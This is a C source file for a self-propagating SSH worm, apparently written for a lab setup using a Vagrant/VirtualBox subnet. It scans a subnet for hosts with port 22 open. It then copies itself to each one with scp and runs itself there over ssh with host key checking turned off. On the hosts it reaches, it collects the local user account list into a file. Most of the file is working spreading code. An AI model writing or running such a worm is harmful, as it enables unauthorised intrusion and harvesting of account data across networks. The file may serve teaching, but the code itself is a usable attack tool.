//gcc -O3 -Wall -W -Wstrict-prototypes -Werror <source> -o <out>
//must compile without warnings   

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <stdbool.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <poll.h>
#include <libgen.h>
#include <sys/types.h>
#include <pwd.h>

//EDIT THESE LINES TO FIT THE PROGRAM TO YOUR CONFIGURATION
//the network address on which the worm operates
const char* network_address="192.168.56.0";
//the network mask on which the worm operates
const char* network_mask="255.255.255.0";
//the admin ip address
const char* admin_address="192.168.56.1";
const char* ssh_user="vagrant";
const char* ssh_private_key_path="id_vb_key";
const char* no_worm_file=".noworm";
const char* worm_outfile="worm.txt";
//----------END OF CONFIGURATION------------------------------

//number of sockets to be opened simultaneously
#define MAX_SOCKETS 15
#define SSH_OPTIONS "-o \"IdentitiesOnly=yes\" -o \"StrictHostKeychecking=no\""

//convenient constant
#define NULL_ADDRESS ((struct in_addr){.s_addr=0})

//compare 2 address and return whether there are equals or not
bool compareInAddr(struct in_addr a,struct in_addr b){
    return ntohl(a.s_addr)==ntohl(b.s_addr);
}

//add end list marker (NULL_ADDRESS)
struct in_addr* padAddressList(struct in_addr* ipList,int size){
    if (ipList!=NULL){
        ipList=realloc(ipList,++size*sizeof(struct in_addr));
        ipList[size-1]=NULL_ADDRESS;
    }
    return ipList;
}

//return whether an address is in list
bool isAddressInList(struct in_addr* ipList,struct in_addr ip){
    if (ipList!=NULL){
        for (int i=0;!compareInAddr(ipList[i],NULL_ADDRESS);i++){
            if(compareInAddr(ip,ipList[i])) return true;
        }
    }
    return false;
}

//subtract 2 list of elements. Return the addresses of a that are not in b
struct in_addr* substractAddresses(struct in_addr* a,struct in_addr* b){
    struct in_addr* result=NULL;
    int resultLen=0;
    if (a!=NULL){
        for (int i=0;!compareInAddr(a[i],NULL_ADDRESS);i++){
            if (!isAddressInList(b,a[i])){
                result=realloc(result,++resultLen*sizeof(struct in_addr));
                result[resultLen-1]=a[i];

                
            }
        }
        result=padAddressList(result,resultLen);
    }
    return result;
}

//return the length of an address list
int getAddressListLength(struct in_addr* ipList){
    int listLen=0;
    if (ipList!=NULL){
        while (!compareInAddr(ipList[listLen],NULL_ADDRESS)) listLen++;
    }
    return listLen;
}

//stringify address list
char* addressListToString(struct in_addr* ipList){
    int listLen=getAddressListLength(ipList);
    char* buffer=malloc(3+(INET_ADDRSTRLEN+3)*listLen);
    char* bufferCpy=buffer;
    char ip[INET_ADDRSTRLEN];

    *bufferCpy++='[';

    for (int i=0;i<listLen;){
        inet_ntop(AF_INET, ipList+i, ip, INET_ADDRSTRLEN);
        *bufferCpy++='"';
        strcpy(bufferCpy,ip);
        bufferCpy+=strlen(ip);
        *bufferCpy++='"';
        if (++i!=listLen) *bufferCpy++=',';
    }

    *bufferCpy++=']';
    *bufferCpy='\0';
    return buffer;
}

//return the address of network interfaces that are in the network
struct in_addr* getHostAddresses(struct in_addr network,struct in_addr mask){
    struct ifaddrs *ifaddr;
    struct in_addr addr,test;
    struct in_addr* result=NULL;
    int resultLen=0;

    network.s_addr&=mask.s_addr;

    if (getifaddrs(&ifaddr) == -1) return result;
    
    for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        
        if (ifa->ifa_addr->sa_family == AF_INET) {
            addr  = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
            test.s_addr=addr.s_addr&mask.s_addr;

            if (compareInAddr(test,network)){
                result=realloc(result,++resultLen*sizeof(struct in_addr));
                result[resultLen-1]=addr;
            }
        }
    }

    freeifaddrs(ifaddr);
    //add end marker
    return padAddressList(result,resultLen);
}

//return the actual number of sockets created
int requestNonBlockingSockets(int *socketList,int size){
    int sockno,counter=0;
    while (counter<size){
        sockno=socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
        if (sockno==-1) break;

        socketList[counter]=sockno;
        counter++;
    }
    return counter;
}

void initSockAddr(struct sockaddr_in* host,uint32_t ip){
    host->sin_family=AF_INET;
    //port 22 -> SSH
    host->sin_port=htons(22);
    host->sin_addr=(struct in_addr){.s_addr=ip};
}

//wait for socket to be readable
int* pollSocket(int* sockno){
    struct pollfd pollStruct;

    pollStruct.fd=*sockno;
    pollStruct.events=POLLIN;

    if (poll(&pollStruct,1,65)>0 && pollStruct.revents==POLLIN){
        return sockno;
    }
    return NULL;
}

//very efficient way to scan all hosts in a network
struct in_addr* getSSHHosts(struct in_addr network,struct in_addr mask){
    //result list
    struct in_addr* result=NULL;
    int resultLen=0;

    network.s_addr&=mask.s_addr;
    //remove broadcast address and network from list
    int hostNumber = ntohl(~mask.s_addr)-1;

    //allocate an array to store file descriptor of sockets
    int* sockets=malloc(sizeof(int)*MAX_SOCKETS);
    //this array holds sockets used in working threads
    int* threadSockets=malloc(sizeof(int)*MAX_SOCKETS);
    //thread id array (index of threadSocket correspond to index in threads array)
    pthread_t* threads=malloc(sizeof(pthread_t)*MAX_SOCKETS);
    //list of hosts (index of hosts correspond to index in threads array)
    struct sockaddr_in* hosts=malloc(sizeof(struct sockaddr_in)*MAX_SOCKETS);
    //return value of a thread
    void* threadResult;

    for (int i=0,socketsAllocated,threadsNumber,maxSockets;i<hostNumber;){
        //get a maximum of sockets
        maxSockets=(i+MAX_SOCKETS>hostNumber)?hostNumber-i:MAX_SOCKETS;
        socketsAllocated=requestNonBlockingSockets(sockets,maxSockets);

        //exit if we cannot have a single socket
        if (socketsAllocated==0) break;

        //reset thread counter
        threadsNumber=0;
        for (int j=0;j<socketsAllocated;j++){
            //init target host address
            initSockAddr(hosts+threadsNumber,htonl(ntohl(network.s_addr)+i+j+1));
            //store socket in list
            threadSockets[threadsNumber]=sockets[j];

            //run asynchronous connection
            if (connect (sockets[j], (struct sockaddr*)(hosts+threadsNumber), sizeof(struct sockaddr_in)) < 0) {
                //if connection is in progress
                if (errno == EINPROGRESS) {
                    //try to create a thread to wait target host response
                    if (pthread_create(threads+threadsNumber,NULL,(void*)pollSocket,threadSockets+threadsNumber)==0){
                        threadsNumber++;
                    //otherwise run pollSocket in main thread (slow down the process)
                    }else if (pollSocket(threadSockets+threadsNumber)!=NULL){
                        result=realloc(result,++resultLen*sizeof(struct in_addr));
                        result[resultLen-1]=hosts[threadsNumber].sin_addr;
                    }
                }
            }else {
                result=realloc(result,++resultLen*sizeof(struct in_addr));
                result[resultLen-1]=hosts[threadsNumber].sin_addr;
            }
        }

        //wait all threads to finish
        for (int j=0;j<threadsNumber;j++){
            if (pthread_join(threads[j],&threadResult)==0){
                //add value in result
                if (threadResult!=NULL){
                    result=realloc(result,++resultLen*sizeof(struct in_addr));
                    result[resultLen-1]=hosts[j].sin_addr;
                }
            }
        }

        //close sockets
        for (int j=0;j<socketsAllocated;j++){
            close(sockets[i]);
        }
        
        i+=socketsAllocated;
    }

    //free ressources
    free(hosts);
    free(sockets);
    free(threadSockets);
    free(threads);

    return padAddressList(result,resultLen);
}

//colonize from list of addresses
void colonize(struct in_addr* hosts,char* programPath){
    char ip[INET_ADDRSTRLEN];
    char command[256];

    char* fileName=basename(programPath);

    if (hosts!=NULL){
        for (int i=0;!compareInAddr(hosts[i],NULL_ADDRESS);i++){
            inet_ntop(AF_INET,hosts+i,ip,INET_ADDRSTRLEN);
            
            snprintf(command,256,"scp " SSH_OPTIONS " -i %s  %s %s@%s:%s",
                ssh_private_key_path,
                programPath,
                ssh_user,
                ip,
                fileName
            );

            printf("Uploading worm to %s...\n",ip);
            if (system(command)!=0){
                printf("Failed to colonize %s !\n",ip);
                continue;
            }

            snprintf(command,256,"ssh " SSH_OPTIONS " -i %s %s@%s \"nohup ./%s\"",
                ssh_private_key_path,
                ssh_user,
                ip,
                fileName
            );

            printf("Executing worm on %s...\n",ip);
            if (system(command)!=0) printf("Failed to run %s on %s !\n",fileName,ip);
        }
    }
}

//check if admin address is in localhost addresses
bool isAdmin(struct in_addr* localhostIPs){
    struct in_addr adminIP;
    inet_pton(AF_INET, admin_address, &adminIP);
    return isAddressInList(localhostIPs,adminIP);
}

//check if .noworm file exists
bool isWormAllowed(void){
    return access(no_worm_file, F_OK) != 0;
}

//check if worm.txt exists
bool hasAlreadyBeenExecuted(void){
    return access(worm_outfile, F_OK) == 0;
}

void doStuff(void){
    struct passwd *p;
    FILE* f;

    puts("Listing users on machine...");
    f=fopen(worm_outfile,"w");

    if (f){
        char* user_property=malloc(1024);

        while((p = getpwent())) {
            snprintf(user_property,1024,"user=\"%s\" dir=\"%s\" shell=\"%s\" uid=%d gid=%d",
                p->pw_name,
                p->pw_dir,
                p->pw_shell,
                p->pw_uid,
                p->pw_gid
            );
            //print line
            puts(user_property);
            //and write it in file
            fputs(user_property,f);
            fputc('\n',f);
        }

        free(user_property);
    }
    fclose(f);
}

int main(void) {
    struct in_addr network,mask;
    char* temp=NULL;

    char* programPath=malloc(FILENAME_MAX*sizeof(char));
    //get absolute path of executable without argv

    readlink("/proc/self/exe",programPath,FILENAME_MAX);
    printf("File path=%s\n",programPath);

    inet_pton(AF_INET, network_address, &network);
    inet_pton(AF_INET, network_mask, &mask);

    struct in_addr* myIps=getHostAddresses(network,mask);

    if (myIps==NULL){
        fprintf(stderr,"Host is not in the network %s with mask %s\n",network_address,network_mask);
        free(programPath);
        free(myIps);
        return EXIT_FAILURE;
    }

    temp=addressListToString(myIps);
    printf("Localhost IPs=%s\n",temp);
    free(temp);
    
    struct in_addr* hosts=getSSHHosts(network,mask);

    temp=addressListToString(hosts);
    printf("Scanned hosts=%s\n",temp);
    free(temp);
    
    if (isAdmin(myIps)){
        struct in_addr* hostsToColonize=substractAddresses(hosts,myIps);

        temp=addressListToString(hostsToColonize);
        printf("Hosts to colonize=%s\n",temp);
        free(temp);

        colonize(hostsToColonize,programPath);

        free(hostsToColonize);    
    }else{
        if (isWormAllowed()){
            if (hasAlreadyBeenExecuted()){
                puts("Worm has already been executed.");
            }else{
                doStuff();
            }
        }else{
            puts("Worm not allowed on this machine. Exiting...");
            //destroy executable
            remove(programPath);
        }
        
    }

    //free allocated ressources
    free(hosts);
    free(myIps);
    free(programPath);
    return EXIT_SUCCESS;
}
